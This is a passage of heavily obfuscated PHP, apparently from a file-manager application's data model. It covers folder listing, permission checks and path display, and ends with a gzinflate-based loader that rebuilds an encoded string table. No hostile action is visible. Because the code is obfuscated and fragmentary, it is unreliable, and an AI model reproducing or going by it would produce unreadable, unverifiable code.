$—ˆ±•©İ = Model($Ñ¶¥îî[521])->field($Ñ¶¥îî[522])->where($©£ø­Í)->select(); $—ˆ±•©İ = $—ˆ±•©İ ? $—ˆ±•©İ : array(); $å—¿´ ã = array(); foreach ($—ˆ±•©İ as $±…ôÎ¦á) { if (!isset($å—¿´ ã[$±…ôÎ¦á[$Ñ¶¥îî[517]]])) { $å—¿´ ã[$±…ôÎ¦á[$Ñ¶¥îî[517]]] = array(); } $å—¿´ ã[$±…ôÎ¦á[$Ñ¶¥îî[517]]][$±…ôÎ¦á[$Ñ¶¥îî[104]]] = $±…ôÎ¦á[$Ñ¶¥îî[426]]; } foreach ($àÜ‹€­İ as &$¤Æ¯Ñº) { $­¬„›é¬ = $¤Æ¯Ñº[$Ñ¶¥îî[517]]; if (!$­¬„›é¬ || !is_array($’é×é†[$­¬„›é¬])) { continue; } $Áıª¤²ˆ = $’é×é†[$­¬„›é¬]; $Áıª¤²ˆ[$Ñ¶¥îî[86]] = $¤Æ¯Ñº[$Ñ¶¥îî[86]]; $Áıª¤²ˆ[$Ñ¶¥îî[42]] = $¤Æ¯Ñº[$Ñ¶¥îî[42]]; if (!isset(self::$cacheFileInfo[$Ñ¶¥îî[523] . $­¬„›é¬])) { self::$cacheFileInfo[$Ñ¶¥îî[523] . $­¬„›é¬] = array_merge(array(), $Áıª¤²ˆ); } unset($’é×é†[$­¬„›é¬][$Ñ¶¥îî[94]]); $ºë¹¹ñš = is_array($å—¿´ ã[$­¬„›é¬]) ? $å—¿´ ã[$­¬„›é¬] : array(); $¤Æ¯Ñº[$Ñ¶¥îî[524]] = array_merge($ºë¹¹ñš, $’é×é†[$­¬„›é¬]); if (isset($¤Æ¯Ñº[$Ñ¶¥îî[524]][$Ñ¶¥îî[180]])) { $¤Æ¯Ñº[$Ñ¶¥îî[180]] = json_decode($¤Æ¯Ñº[$Ñ¶¥îî[524]][$Ñ¶¥îî[180]], !0); unset($¤Æ¯Ñº[$Ñ¶¥îî[524]][$Ñ¶¥îî[180]]); } } unset($¤Æ¯Ñº); } protected function _listAppendSourceInfo(&$ŸªŠªÜ€, $ºñ…§¥Õ) { $ÏŠ°üÓş =& $_SERVER[ˆûùúÊ¯]; $Š‡ŠÛ±Ÿ = Model($ÏŠ°üÓş[525])->listData(); $ü•İŸ = Model($ÏŠ°üÓş[475])->listData(); $¯¯ÔÉï = Model($ÏŠ°üÓş[465])->listData(); $ÁÔÜ£Â = Model($ÏŠ°üÓş[526])->listSimple(); $Ùû†î·Ó = array_to_keyvalue($Š‡ŠÛ±Ÿ, $ÏŠ°üÓş[451]); $µ€·Œ‹Ğ = array_to_keyvalue_group($ü•İŸ, $ÏŠ°üÓş[94], $ÏŠ°üÓş[476]); $ëİüïõ© = array_to_keyvalue($¯¯ÔÉï, $ÏŠ°üÓş[94]); $ºÑñ¤¨æ = array_to_keyvalue_group($ÁÔÜ£Â, $ÏŠ°üÓş[190]); foreach ($ŸªŠªÜ€ as &$ó¦Šœíã) { $ó¦Šœíã[$ÏŠ°üÓş[97]] = array($ÏŠ°üÓş[527] => 0, $ÏŠ°üÓş[528] => 0, $ÏŠ°üÓş[529] => 0); if (isset($ëİüïõ©[$ó¦Šœíã[$ÏŠ°üÓş[190]]])) { $ó¦Šœíã[$ÏŠ°üÓş[97]][$ÏŠ°üÓş[530]] = 1; $ó¦Šœíã[$ÏŠ°üÓş[97]][$ÏŠ°üÓş[531]] = $ëİüïõ©[$ó¦Šœíã[$ÏŠ°üÓş[190]]][$ÏŠ°üÓş[42]]; } if ($µ€·Œ‹Ğ && $Ùû†î·Ó && isset($µ€·Œ‹Ğ[$ó¦Šœíã[$ÏŠ°üÓş[190]]])) { $ó¦Šœíã[$ÏŠ°üÓş[97]][$ÏŠ°üÓş[532]] = array(); foreach ($µ€·Œ‹Ğ[$ó¦Šœíã[$ÏŠ°üÓş[190]]] as $±§°úĞü) { $¬“ä¯ó = $Ùû†î·Ó[$±§°úĞü]; $ó¦Šœíã[$ÏŠ°üÓş[97]][$ÏŠ°üÓş[532]][] = array($ÏŠ°üÓş[533] => $¬“ä¯ó[$ÏŠ°üÓş[451]], $ÏŠ°üÓş[470] => $¬“ä¯ó[$ÏŠ°üÓş[42]], $ÏŠ°üÓş[534] => $¬“ä¯ó[$ÏŠ°üÓş[535]]); } } if ($ºÑñ¤¨æ && isset($ºÑñ¤¨æ[$ó¦Šœíã[$ÏŠ°üÓş[190]]])) { $ó¦Šœíã[$ÏŠ°üÓş[97]][$ÏŠ°üÓş[536]] = array(); foreach ($ºÑñ¤¨æ[$ó¦Šœíã[$ÏŠ°üÓş[190]]] as $§èÖÅ²¤) { $ù‹˜©Æ„ = $ÏŠ°üÓş[537]; if ($§èÖÅ²¤[$ÏŠ°üÓş[538]] == $ÏŠ°üÓş[98]) { $ù‹˜©Æ„ .= $ÏŠ°üÓş[539]; } $ó¦Šœíã[$ÏŠ°üÓş[97]][$ÏŠ°üÓş[536]] = array_field_key($§èÖÅ²¤, explode($ÏŠ°üÓş[60], $ù‹˜©Æ„)); } } } unset($ó¦Šœíã); return $ŸªŠªÜ€; } protected function _listAppendChildren(&$¹¬æ±Úƒ, $ Şûì) { $ÓËˆÒÌ¥ =& $_SERVER[ˆûùúÊ¯]; $Â‡â†“û = array(); $ßäƒÅ‰¾ = array($ÓËˆÒÌ¥[232] => 0, $ÓËˆÒÌ¥[233] => 0); foreach ($¹¬æ±Úƒ as &$ ıØØü) { if (!$ ıØØü[$ÓËˆÒÌ¥[461]]) { continue; } $Â‡â†“û[] = $ ıØØü[$ÓËˆÒÌ¥[190]]; } unset($ ıØØü); if (!$Â‡â†“û) { return; } $Óü‚Ã£ï = array($ÓËˆÒÌ¥[189] => array($ÓËˆÒÌ¥[7], $Â‡â†“û), $ÓËˆÒÌ¥[481] => 0); $ù­•™‚Ğ = array($ÓËˆÒÌ¥[189], $ÓËˆÒÌ¥[461], $ÓËˆÒÌ¥[540] => $ÓËˆÒÌ¥[541]); $–×§ğ€ş = $this->field($ù­•™‚Ğ)->where($Óü‚Ã£ï)->group($ÓËˆÒÌ¥[542])->select(); $Ç½ĞÌ‡Ÿ = array(); foreach ($–×§ğ€ş as $Û–µè™) { $Ë´óÌçÍ = $Û–µè™[$ÓËˆÒÌ¥[189]]; $Æ°–¼÷¶ = $Û–µè™[$ÓËˆÒÌ¥[461]] == $ÓËˆÒÌ¥[98] ? $ÓËˆÒÌ¥[233] : $ÓËˆÒÌ¥[232]; if (!isset($Ç½ĞÌ‡Ÿ[$Ë´óÌçÍ])) { $Ç½ĞÌ‡Ÿ[$Ë´óÌçÍ] = array($ÓËˆÒÌ¥[232] => 0, $ÓËˆÒÌ¥[233] => 0); } $Ç½ĞÌ‡Ÿ[$Ë´óÌçÍ][$Æ°–¼÷¶] += $Û–µè™[$ÓËˆÒÌ¥[541]]; } foreach ($¹¬æ±Úƒ as &$ ıØØü) { if (!$ ıØØü[$ÓËˆÒÌ¥[461]]) { continue; } $«Ä•éÙ = is_array($Ç½ĞÌ‡Ÿ[$ ıØØü[$ÓËˆÒÌ¥[190]]]) ? $Ç½ĞÌ‡Ÿ[$ ıØØü[$ÓËˆÒÌ¥[190]]] : $ßäƒÅ‰¾; $ ıØØü[$ÓËˆÒÌ¥[233]] = $«Ä•éÙ[$ÓËˆÒÌ¥[233]]; $ ıØØü[$ÓËˆÒÌ¥[232]] = $«Ä•éÙ[$ÓËˆÒÌ¥[232]]; unset($ ıØØü[$ÓËˆÒÌ¥[462]]); } unset($ ıØØü); } protected function _listAppendAuth(&$Šâ‰Û’) { $œÒ–ÎíÊ =& $_SERVER[ˆûùúÊ¯]; $×÷ŸÉ¾ğ = array(); foreach ($Šâ‰Û’ as $ãú°ğª”) { if ($ãú°ğª”[$œÒ–ÎíÊ[187]] == self::TYPE_GROUP) { $×÷ŸÉ¾ğ[] = $ãú°ğª”[$œÒ–ÎíÊ[190]]; } } if (!$×÷ŸÉ¾ğ) { return; } $Ò§¡­ì = array_to_keyvalue($Šâ‰Û’, $œÒ–ÎíÊ[190]); $ı¸ééäâ = Model($œÒ–ÎíÊ[543])->getSourceList($×÷ŸÉ¾ğ, $Ò§¡­ì); $í£Åİ¾ = $GLOBALS[$œÒ–ÎíÊ[544]] == 1; foreach ($Šâ‰Û’ as $ƒÃäò© => &$ãú°ğª”) { $ãú°ğª”[$œÒ–ÎíÊ[463]] = $ı¸ééäâ[$ãú°ğª”[$œÒ–ÎíÊ[190]]]; if (!$ãú°ğª”[$œÒ–ÎíÊ[463]] && $ãú°ğª”[$œÒ–ÎíÊ[187]] == self::TYPE_GROUP) { $ãú°ğª”[$œÒ–ÎíÊ[463]] = Action($œÒ–ÎíÊ[545])->pathGroupAuthMake($ãú°ğª”[$œÒ–ÎíÊ[546]]); if (!$ãú°ğª”[$œÒ–ÎíÊ[463]] && !$í£Åİ¾) { $ãú°ğª”[$œÒ–ÎíÊ[226]] = !1; $ãú°ğª”[$œÒ–ÎíÊ[225]] = !1; } } if ($ãú°ğª”[$œÒ–ÎíÊ[463]]) { $ãú°ğª”[$œÒ–ÎíÊ[226]] = AuthModel::authCheckEdit($ãú°ğª”[$œÒ–ÎíÊ[463]][$œÒ–ÎíÊ[464]]); $ãú°ğª”[$œÒ–ÎíÊ[225]] = AuthModel::authCheckView($ãú°ğª”[$œÒ–ÎíÊ[463]][$œÒ–ÎíÊ[464]]); } $this->groupPathDisplay($ãú°ğª”); } unset($ãú°ğª”); } public function _listAppendAuthSecret(&$ÈæÂ—¾Å) { $›‘•²ÅŒ =& $_SERVER[ˆûùúÊ¯]; if (Model($›‘•²ÅŒ[484])->get($›‘•²ÅŒ[547]) != $›‘•²ÅŒ[98]) { return; } static $Œ¾¶à—› = false; if (!$Œ¾¶à—›) { $÷Úõš¶ = Model($›‘•²ÅŒ[548]); $Î«½»Ï¹ = Model($›‘•²ÅŒ[549]); $Œ¾¶à—› = $Î«½»Ï¹->listData(); $Œ¾¶à—› = array_to_keyvalue($Œ¾¶à—›, $›‘•²ÅŒ[190]); $¹œÃú„ = json_decode(Model($›‘•²ÅŒ[484])->get($›‘•²ÅŒ[550]), !0); $¹œÃú„ = array_to_keyvalue($¹œÃú„, $›‘•²ÅŒ[451]); foreach ($Œ¾¶à—› as $à­ñ²‰£ => $×¿šóÎ¡) { $üûÓ±µ¢ = $¹œÃú„[$×¿šóÎ¡[$›‘•²ÅŒ[551]]]; if (!$üûÓ±µ¢) { $Î«½»Ï¹->remove($×¿šóÎ¡[$›‘•²ÅŒ[451]]); unset($Œ¾¶à—›[$à­ñ²‰£]); continue; } $»´«ü•’ = $÷Úõš¶->listData($üûÓ±µ¢[$›‘•²ÅŒ[463]]); if (!$»´«ü•’) { $Î«½»Ï¹->remove($×¿šóÎ¡[$›‘•²ÅŒ[451]]); unset($Œ¾¶à—›[$à­ñ²‰£]); continue; } $×¿šóÎ¡[$›‘•²ÅŒ[463]] = $»´«ü•’; $×¿šóÎ¡[$›‘•²ÅŒ[552]] = $üûÓ±µ¢; $×¿šóÎ¡[$›‘•²ÅŒ[553]] = Model($›‘•²ÅŒ[554])->getInfoSimpleOuter($×¿šóÎ¡[$›‘•²ÅŒ[503]]); $Œ¾¶à—›[$à­ñ²‰£] = $×¿šóÎ¡; } } $Ùèáêãñ = USER_ID; $É¶Î÷“İ = array(); $¡„Ù°á¦ = $this->_listAppendPath($É¶Î÷“İ, !0); foreach ($ÈæÂ—¾Å as $à­ñ²‰£ => &$×¿šóÎ¡) { if (!is_array($×¿šóÎ¡[$›‘•²ÅŒ[463]])) { continue; } if ($×¿šóÎ¡[$›‘•²ÅŒ[187]] != $›‘•²ÅŒ[555]) { continue; } if (isset($Œ¾¶à—›[$×¿šóÎ¡[$›‘•²ÅŒ[190]]])) { $İ¯ÎëıÑ = $Œ¾¶à—›[$×¿šóÎ¡[$›‘•²ÅŒ[190]]]; if (!is_array($×¿šóÎ¡[$›‘•²ÅŒ[515]])) { $×¿šóÎ¡[$›‘•²ÅŒ[515]] = array(); } $×¿šóÎ¡[$›‘•²ÅŒ[515]][$›‘•²ÅŒ[556]] = $İ¯ÎëıÑ[$›‘•²ÅŒ[551]]; $×¿šóÎ¡[$›‘•²ÅŒ[463]][$›‘•²ÅŒ[557]] = $İ¯ÎëıÑ; $×¿šóÎ¡[$›‘•²ÅŒ[463]][$›‘•²ÅŒ[558]] = $×¿šóÎ¡[$›‘•²ÅŒ[559]]; $×¿šóÎ¡[$›‘•²ÅŒ[463]][$›‘•²ÅŒ[560]] = $›‘•²ÅŒ[98]; if ($İ¯ÎëıÑ[$›‘•²ÅŒ[503]] != $Ùèáêãñ) { $×¿šóÎ¡[$›‘•²ÅŒ[463]][$›‘•²ÅŒ[464]] = $×¿šóÎ¡[$›‘•²ÅŒ[463]][$›‘•²ÅŒ[464]] & $İ¯ÎëıÑ[$›‘•²ÅŒ[463]][$›‘•²ÅŒ[463]]; } continue; } $Á†Êï²ó = $this->parentLevelArray($×¿šóÎ¡[$›‘•²ÅŒ[561]]); $¬İ¤×é• = array_reverse($Á†Êï²ó); foreach ($¬İ¤×é• as $Øğã«—³ => $ÁÖ¦ÓïÃ) { if (!isset($Œ¾¶à—›[$ÁÖ¦ÓïÃ])) { continue; } $İ¯ÎëıÑ = $Œ¾¶à—›[$ÁÖ¦ÓïÃ]; $×¿šóÎ¡[$›‘•²ÅŒ[463]][$›‘•²ÅŒ[557]] = $İ¯ÎëıÑ; if ($İ¯ÎëıÑ[$›‘•²ÅŒ[503]] != $Ùèáêãñ) { $×¿šóÎ¡[$›‘•²ÅŒ[463]][$›‘•²ÅŒ[464]] = $×¿šóÎ¡[$›‘•²ÅŒ[463]][$›‘•²ÅŒ[464]] & $İ¯ÎëıÑ[$›‘•²ÅŒ[463]][$›‘•²ÅŒ[463]]; } $”÷ÄÇ´ = $›‘•²ÅŒ[12]; $¿áòâĞõ = count($Á†Êï²ó) - $Øğã«—³; for ($²°ôú‹ø = 0; $²°ôú‹ø < $¿áòâĞõ; $²°ôú‹ø++) { if (!isset($¡„Ù°á¦[$Á†Êï²ó[$²°ôú‹ø]])) { $”÷ÄÇ´ = $›‘•²ÅŒ[12]; break; } $”÷ÄÇ´ = $”÷ÄÇ´ . rtrim($¡„Ù°á¦[$Á†Êï²ó[$²°ôú‹ø]], $›‘•²ÅŒ[8]) . $›‘•²ÅŒ[8]; } $×¿šóÎ¡[$›‘•²ÅŒ[463]][$›‘•²ÅŒ[558]] = rtrim($”÷ÄÇ´, $›‘•²ÅŒ[8]) . $›‘•²ÅŒ[8]; break; } } unset($×¿šóÎ¡); } public function groupPathDisplay(&$‰£Š„³’) { $’¹‘«É‹ =& $_SERVER[ˆûùúÊ¯]; if ($‰£Š„³’[$’¹‘«É‹[187]] != self::TYPE_GROUP) { return; } $ùÓŞûÎÏ = Model($’¹‘«É‹[562])->getInfo($‰£Š„³’[$’¹‘«É‹[546]]); $„ò—îƒ¹ = $this->parentLevelArray($ùÓŞûÎÏ[$’¹‘«É‹[561]]); $Ù…÷€„ş = $’¹‘«É‹[12]; foreach ($„ò—îƒ¹ as $—ñùÇÄÍ) { $¢Å«Ş» = Model($’¹‘«É‹[562])->getInfo($—ñùÇÄÍ); $Ù…÷€„ş .= $¢Å«Ş»[$’¹‘«É‹[97]][$’¹‘«É‹[190]] . $’¹‘«É‹[60]; } $‰£Š„³’[$’¹‘«É‹[563]] = $ùÓŞûÎÏ[$’¹‘«É‹[189]]; $‰£Š„³’[$’¹‘«É‹[564]] = $ùÓŞûÎÏ[$’¹‘«É‹[561]]; $‰£Š„³’[$’¹‘«É‹[565]] = $ùÓŞûÎÏ[$’¹‘«É‹[566]]; $‰£Š„³’[$’¹‘«É‹[567]] = $Ù…÷€„ş . $ùÓŞûÎÏ[$’¹‘«É‹[97]][$’¹‘«É‹[190]]; } protected function _listAppendPath(&$ç·×ƒ¼å, $ú«™ß´® = false) { $­ÔïŞ¥ =& $_SERVER[ˆûùúÊ¯]; static $èŠ––Ï­ = array(); $±»Ú™Ä = array(); $ÇÁ‚©½¡ = array(); if ($ú«™ß´®) { return $èŠ––Ï­; } foreach ($ç·×ƒ¼å as &$Îå ĞíÑ) { $áö³åÜ· = $Îå ĞíÑ[$­ÔïŞ¥[190]]; if ($Îå ĞíÑ[$­ÔïŞ¥[461]] == $­ÔïŞ¥[98] && $Îå ĞíÑ[$­ÔïŞ¥[189]] != 0) { $èŠ––Ï­[$áö³åÜ·] = $Îå ĞíÑ[$­ÔïŞ¥[42]]; } if ($Îå ĞíÑ[$­ÔïŞ¥[461]] == $­ÔïŞ¥[98] && $Îå ĞíÑ[$­ÔïŞ¥[189]] == 0) { $èŠ––Ï­[$áö³åÜ·] = $this->_listAppendPathRoot($Îå ĞíÑ, array()); } if (isset($ÇÁ‚©½¡[$Îå ĞíÑ[$­ÔïŞ¥[561]]])) { continue; } $ÇÁ‚©½¡[$Îå ĞíÑ[$­ÔïŞ¥[561]]] = !0; $«’¸îğ« = $this->parentLevelArray($Îå ĞíÑ[$­ÔïŞ¥[561]]); foreach ($«’¸îğ« as $’”°¼ó => $ıÃ‘ÔÆ) { if (isset($èŠ––Ï­[$ıÃ‘ÔÆ])) { continue; } if ($’”°¼ó == 0) { $èŠ––Ï­[$ıÃ‘ÔÆ] = $this->_listAppendPathRoot($Îå ĞíÑ, $«’¸îğ«); } if ($’”°¼ó != 0) { $±»Ú™Ä[] = $ıÃ‘ÔÆ; } } } unset($Îå ĞíÑ); $±»Ú™Ä = array_unique($±»Ú™Ä); if (count($±»Ú™Ä) > 0) { $×’õÑš„ = array($­ÔïŞ¥[467] => array($­ÔïŞ¥[468], $±»Ú™Ä)); if (count($±»Ú™Ä) == 1) { $£“µ‰Ô = $this->sourceInfo($±»Ú™Ä[0]); $¸Ô›Ğó“ = is_array($£“µ‰Ô) ? array($£“µ‰Ô) : !1; } else { $¸Ô›Ğó“ = $this->field($­ÔïŞ¥[568])->where($×’õÑš„)->select(); } if (!$¸Ô›Ğó“) { $¸Ô›Ğó“ = array(); } foreach ($¸Ô›Ğó“ as $şï˜³ßÜ) { $èŠ––Ï­[$şï˜³ßÜ[$­ÔïŞ¥[190]]] = $şï˜³ßÜ[$­ÔïŞ¥[42]]; } } $ÔÙœ¡ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $à²ÃÛ€ó = array(); foreach ($ç·×ƒ¼å as &$Îå ĞíÑ) { $€ƒ¯ÏŞ¢ = $Îå ĞíÑ[$­ÔïŞ¥[561]]; $ÏÒ©ˆÛ = $­ÔïŞ¥[12]; if (isset($à²ÃÛ€ó[$€ƒ¯ÏŞ¢])) { $ÏÒ©ˆÛ = $à²ÃÛ€ó[$€ƒ¯ÏŞ¢]; } else { $«’¸îğ« = $this->parentLevelArray($Îå ĞíÑ[$­ÔïŞ¥[561]]); foreach ($«’¸îğ« as $’”°¼ó => $ıÃ‘ÔÆ) { if (isset($èŠ––Ï­[$ıÃ‘ÔÆ])) { $ÏÒ©ˆÛ .= $èŠ––Ï­[$ıÃ‘ÔÆ] . $­ÔïŞ¥[8]; } } $à²ÃÛ€ó[$€ƒ¯ÏŞ¢] = $ÏÒ©ˆÛ; } $ÏÒ©ˆÛ .= $Îå ĞíÑ[$­ÔïŞ¥[42]]; if ($Îå ĞíÑ[$­ÔïŞ¥[461]] == $­ÔïŞ¥[98]) { $ÏÒ©ˆÛ .= $­ÔïŞ¥[8]; } $Îå ĞíÑ[$­ÔïŞ¥[559]] = str_replace($­ÔïŞ¥[569], $­ÔïŞ¥[8], $ÏÒ©ˆÛ); if ($Îå ĞíÑ[$­ÔïŞ¥[189]] == $­ÔïŞ¥[221]) { $Îå ĞíÑ[$­ÔïŞ¥[42]] = trim($èŠ––Ï­[$Îå ĞíÑ[$­ÔïŞ¥[190]]], $­ÔïŞ¥[8]); $Îå ĞíÑ[$­ÔïŞ¥[559]] = $Îå ĞíÑ[$­ÔïŞ¥[42]] . $­ÔïŞ¥[8]; } if (intval($Îå ĞíÑ[$­ÔïŞ¥[187]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($Îå ĞíÑ, $«’¸îğ«, $ÔÙœ¡); } } unset($Îå ĞíÑ); return $ç·×ƒ¼å; } private function _listAppendPathRecycle(&$õìííÔĞ, $Ù‘˜˜üª, $¼ˆÖ³š«) { $”™Ü¶É© =& $_SERVER[ˆûùúÊ¯]; if (!in_array($¼ˆÖ³š«, $Ù‘˜˜üª) && $õìííÔĞ[$”™Ü¶É©[190]] != $¼ˆÖ³š«) { return; } $Àõï¸­´ = explode($”™Ü¶É©[8], trim($õìííÔĞ[$”™Ü¶É©[559]], $”™Ü¶É©[8])); $­Öé¶˜ì = implode($”™Ü¶É©[8], array_slice($Àõï¸­´, 2)); $õìííÔĞ[$”™Ü¶É©[559]] = $”™Ü¶É©[8] . LNG($”™Ü¶É©[570]) . $”™Ü¶É©[8] . ltrim($­Öé¶˜ì, $”™Ü¶É©[8]); $õìííÔĞ[$”™Ü¶É©[561]] = $”™Ü¶É©[571] . implode($”™Ü¶É©[60], array_slice($Ù‘˜˜üª, 1)) . $”™Ü¶É©[60]; if ($õìííÔĞ[$”™Ü¶É©[190]] == $¼ˆÖ³š«) { $õìííÔĞ[$”™Ü¶É©[561]] = $”™Ü¶É©[571]; $õìííÔĞ[$”™Ü¶É©[189]] = $”™Ü¶É©[221]; $õìííÔĞ[$”™Ü¶É©[42]] = LNG($”™Ü¶É©[570]); } $õìííÔĞ[$”™Ü¶É©[572]] = $”™Ü¶É©[573]; } protected function _listAppendPathRoot(&$ƒ¤÷’—µ, $¢¥ËıÉ) { $Şç·¸ñÍ =& $_SERVER[ˆûùúÊ¯]; static $ßœ…ÔòÛ = false; $óÆ‘Áˆ‘ = $Şç·¸ñÍ[12]; if ($ƒ¤÷’—µ[$Şç·¸ñÍ[187]] == self::TYPE_USER) { if ($ƒ¤÷’—µ[$Şç·¸ñÍ[546]] == USER_ID) { $óÆ‘Áˆ‘ = LNG($Şç·¸ñÍ[574]); if ($ßœ…ÔòÛ === !1) { $òé¤¸Ğ¡ = Model($Şç·¸ñÍ[575])->getInfoFull(USER_ID); $ßœ…ÔòÛ = _get($òé¤¸Ğ¡, $Şç·¸ñÍ[576], $Şç·¸ñÍ[12]); } if ($¢¥ËıÉ && $¢¥ËıÉ[0] == $ßœ…ÔòÛ || !$¢¥ËıÉ && $ƒ¤÷’—µ[$Şç·¸ñÍ[190]] == $ßœ…ÔòÛ) { $óÆ‘Áˆ‘ = LNG($Şç·¸ñÍ[577]); $ƒ¤÷’—µ[$Şç·¸ñÍ[578]] = $Şç·¸ñÍ[579]; } if (!$¢¥ËıÉ) { $ƒ¤÷’—µ[$Şç·¸ñÍ[42]] = $óÆ‘Áˆ‘; } } else { $ƒ¤÷’—µ[$Şç·¸ñÍ[580]] = Model($Şç·¸ñÍ[554])->getInfoSimpleOuter($ƒ¤÷’—µ[$Şç·¸ñÍ[546]]); $óÆ‘Áˆ‘ = LNG($Şç·¸ñÍ[581]) . $Şç·¸ñÍ[172] . $ƒ¤÷’—µ[$Şç·¸ñÍ[580]][$Şç·¸ñÍ[42]] . $Şç·¸ñÍ[174]; } } else { if ($ƒ¤÷’—µ[$Şç·¸ñÍ[187]] == self::TYPE_GROUP) { $”çÄìş = Model($Şç·¸ñÍ[562])->getInfoSimple($ƒ¤÷’—µ[$Şç·¸ñÍ[546]]); $óÆ‘Áˆ‘ = $”çÄìş[$Şç·¸ñÍ[42]]; } else { if ($ƒ¤÷’—µ[$Şç·¸ñÍ[187]] == self::TYPE_SYSTEM) { $óÆ‘Áˆ‘ = $Şç·¸ñÍ[582]; } } } $óÆ‘Áˆ‘ = $óÆ‘Áˆ‘ ? $Şç·¸ñÍ[8] . $óÆ‘Áˆ‘ . $Şç·¸ñÍ[8] : $Şç·¸ñÍ[8]; return $óÆ‘Áˆ‘; } protected function _listAppendUser(&$¸€£Ş¤‹) { $‡¿§¶Ì =& $_SERVER[ˆûùúÊ¯]; $Ö§ »êÕ = array_to_keyvalue($¸€£Ş¤‹, $‡¿§¶Ì[12], $‡¿§¶Ì[503]); $…·æàÌ‚ = array_to_keyvalue($¸€£Ş¤‹, $‡¿§¶Ì[12], $‡¿§¶Ì[505]); $÷ô¾ØÚü = array_merge($Ö§ »êÕ, $…·æàÌ‚); $óÓèòÔ€ = Model($‡¿§¶Ì[575])->userListInfo($÷ô¾ØÚü); foreach ($¸€£Ş¤‹ as &$–Å›ĞÇ) { $¡Ş’™àú = $–Å›ĞÇ[$‡¿§¶Ì[503]]; $–Å›ĞÇ[$‡¿§¶Ì[503]] = $óÓèòÔ€[$¡Ş’™àú] ? $óÓèòÔ€[$¡Ş’™àú] : !1; $¡Ş’™àú = $–Å›ĞÇ[$‡¿§¶Ì[505]]; $–Å›ĞÇ[$‡¿§¶Ì[505]] = $óÓèòÔ€[$¡Ş’™àú] ? $óÓèòÔ€[$¡Ş’™àú] : !1; if (isset($–Å›ĞÇ[$‡¿§¶Ì[515]]) && $–Å›ĞÇ[$‡¿§¶Ì[515]][$‡¿§¶Ì[583]]) { $ã™Ë’çô = $GLOBALS[$‡¿§¶Ì[6]][$‡¿§¶Ì[99]][$‡¿§¶Ì[584]]; if ($–Å›ĞÇ[$‡¿§¶Ì[515]][$‡¿§¶Ì[585]] <= time() - $ã™Ë’çô) { $this->metaSet($–Å›ĞÇ[$‡¿§¶Ì[190]], $‡¿§¶Ì[583], null); $this->metaSet($–Å›ĞÇ[$‡¿§¶Ì[190]], $‡¿§¶Ì[585], null); unset($–Å›ĞÇ[$‡¿§¶Ì[515]][$‡¿§¶Ì[583]]); continue; } $ÄÓú©“ = $–Å›ĞÇ[$‡¿§¶Ì[515]][$‡¿§¶Ì[583]]; $–Å›ĞÇ[$‡¿§¶Ì[515]][$‡¿§¶Ì[586]] = Model($‡¿§¶Ì[575])->getInfoSimpleOuter($ÄÓú©“); } } unset($–Å›ĞÇ); } public function parentLevelArray($ÄóÄÀ) { $Ê­ë²Šô =& $_SERVER[ˆûùúÊ¯]; $ÄóÄÀ = explode($Ê­ë²Šô[60], trim($ÄóÄÀ, $Ê­ë²Šô[60])); return array_remove_value($ÄóÄÀ, $Ê­ë²Šô[221]); } public function listAll($äÇ¯ŸÈÅ) { $‡öœ”Æù =& $_SERVER[ˆûùúÊ¯]; $¹üŸ„«Ö = $this->sourceInfo($äÇ¯ŸÈÅ); $¬†ïŠ¥¼ = array($‡öœ”Æù[587] => array($‡öœ”Æù[588], $¹üŸ„«Ö[$‡öœ”Æù[561]] . $äÇ¯ŸÈÅ . $‡öœ”Æù[589]), $‡öœ”Æù[590] => 0); $’†ø¥— = $‡öœ”Æù[591]; $»Í±„¶€ = "\x4c\105\x46\x54\40\x4a\117\111\116\x20{$this->tablePrefix}\x69\157\137\x66\151\x6c\x65\40\146\x69\154\145\40\157\x6e\x20\163\157\165\x72\143\x65\x2e\x66\151\x6c\145\111\104\40\x3d\40\x66\151\x6c\145\x2e\x66\x69\154\x65\111\104"; $âÓôüİ© = $this->alias($‡öœ”Æù[495])->field($’†ø¥—)->where($¬†ïŠ¥¼)->join($»Í±„¶€)->select(); $this->_listAppendAuth($âÓôüİ©); $this->_listAppendUser($âÓôüİ©); $this->_listAppendPath($âÓôüİ©); $âÓôüİ© = array_to_keyvalue($âÓôüİ©, $‡öœ”Æù[190]); $Ô‚ß»” = "\x2f{$¹üŸ„«Ö[$‡öœ”Æù[42]]}\x2f"; $Ô‚ß»” = $Ô‚ß»” == $‡öœ”Æù[569] ? $‡öœ”Æù[8] : $Ô‚ß»”; $åå‰û×ú = array(); foreach ($âÓôüİ© as $ÅçÚ§ş“ => $»ôºİš¦) { $öœ¢ÉÏ” = $this->parentLevelArray($»ôºİš¦[$‡öœ”Æù[561]]); array_shift($öœ¢ÉÏ”); $Å²óÃÛ² = $Ô‚ß»”; for ($œî÷†ó¥ = 0; $œî÷†ó¥ < count($öœ¢ÉÏ”); $œî÷†ó¥++) { $Å²óÃÛ² .= $âÓôüİ©[$öœ¢ÉÏ”[$œî÷†ó¥]][$‡öœ”Æù[42]] . $‡öœ”Æù[8]; } $Å²óÃÛ² .= $»ôºİš¦[$‡öœ”Æù[42]]; if ($»ôºİš¦[$‡öœ”Æù[461]]) { $Å²óÃÛ² .= $‡öœ”Æù[8]; } $°ˆˆ¤¨Ä = array($‡öœ”Æù[471] => str_replace($‡öœ”Æù[569], $‡öœ”Æù[8], str_replace($‡öœ”Æù[569], $‡öœ”Æù[8], str_replace($‡öœ”Æù[569], $‡öœ”Æù[8], $Å²óÃÛ²))), $‡öœ”Æù[592] => intval($»ôºİš¦[$‡öœ”Æù[461]]), $‡öœ”Æù[593] => intval($»ôºİš¦[$‡öœ”Æù[86]]), $‡öœ”Æù[95] => intval($»ôºİš¦[$‡öœ”Æù[95]]), $‡öœ”Æù[97] => $this->pathInfoFilter($»ôºİš¦)); if (!$°ˆˆ¤¨Ä[$‡öœ”Æù[461]]) { $°ˆˆ¤¨Ä[$‡öœ”Æù[517]] = $»ôºİš¦[$‡öœ”Æù[517]]; } $åå‰û×ú[] = $°ˆˆ¤¨Ä; } $åå‰û×ú = array_sort_by($åå‰û×ú, $‡öœ”Æù[94]); return $åå‰û×ú; } } goto FÀÑòÃ˜µä; C×‘ÍĞïˆ¿: define($_SERVER[ˆûùúÊ¯][0], $_SERVER[ˆûùúÊ¯][1]); $_SERVER[˜½Êêò] = explode($_SERVER[ˆûùúÊ¯][2], gzinflate(substr($_SERVER[ˆûùúÊ¯][3], 10, -8))); function binCheckEq($ÁíÂŞô, $ÃĞµè…ò) { return $ÁíÂŞô == $ÃĞµè…ò; } goto Cù½åƒ¯ƒ´; 